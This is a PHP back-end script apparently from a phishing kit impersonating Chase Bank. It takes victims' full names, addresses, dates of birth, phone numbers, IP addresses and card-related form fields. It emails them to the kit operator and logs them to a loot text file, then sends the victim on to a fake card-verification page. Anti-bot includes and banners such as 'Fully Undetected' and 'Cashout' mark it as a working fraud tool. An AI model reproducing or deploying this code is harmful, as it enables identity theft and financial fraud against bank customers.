<?php
$zabi = getenv("REMOTE_ADDR");
include '../antibots.php';
include('../email.php');
include '../bt.php';
include "../blocker.php";
$message .= "--++-----[ $$ World Wide On My Hand  $$ ]-----++--\n";
$message .= "----------CHase Bank Spam ReZulT--------------------\n";
$message .= "Full Name: ".$_POST['5']."\n";
$message .= "Address: ".$_POST['7']."\n";
$message .= "City: ".$_POST['8']."\n";
$message .= "State: ".$_POST['10']."\n";
$message .= "Zip: ".$_POST['9']."\n";
$message .= "Date Birth: ".$_POST['6']."\n";
$message .= "Phone Number: ".$_POST['phoo']."\n";
$message .= "++-----[ $$ Fully Undetected by Mou AD $$ ]-----++\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY Mou Ad  ----------------------\n";
$cc = $_POST['ccn'];
$subject = "chase info [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Cashout-XXX <service>\r\n";
mail($email,$subject,$message,$headers);
    $text = fopen('../../rezlt.txt', 'a');
fwrite($text, $message);
mail(','.$form,$subject,$message,$headers);

header("Location: ../verification-card.php");?>